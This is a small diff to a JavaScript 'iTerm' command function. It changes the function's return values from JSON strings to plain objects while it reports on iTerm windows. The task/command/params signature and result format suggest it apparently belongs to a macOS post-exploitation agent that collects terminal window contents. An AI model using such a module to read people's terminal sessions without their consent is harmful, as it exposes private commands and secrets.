@@ -18,13 +18,13 @@ exports.iTerm = function(task, command, params){
                 }
                 output["Window: " + i] = window;
             }
-            return JSON.stringify({"user_output":JSON.stringify(output, null, 2), "completed": true});
+            return {"user_output":JSON.stringify(output, null, 2), "completed": true};
         }
         else{
-            return JSON.stringify({"user_output":"iTerm isn't running", "completed": true, "status": "error"});
+            return {"user_output":"iTerm isn't running", "completed": true, "status": "error"};
         }
     }catch(error){
-        return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
+        return {"user_output":error.toString(), "completed": true, "status": "error"};
     }
 };
 COMMAND_ENDS_HERE
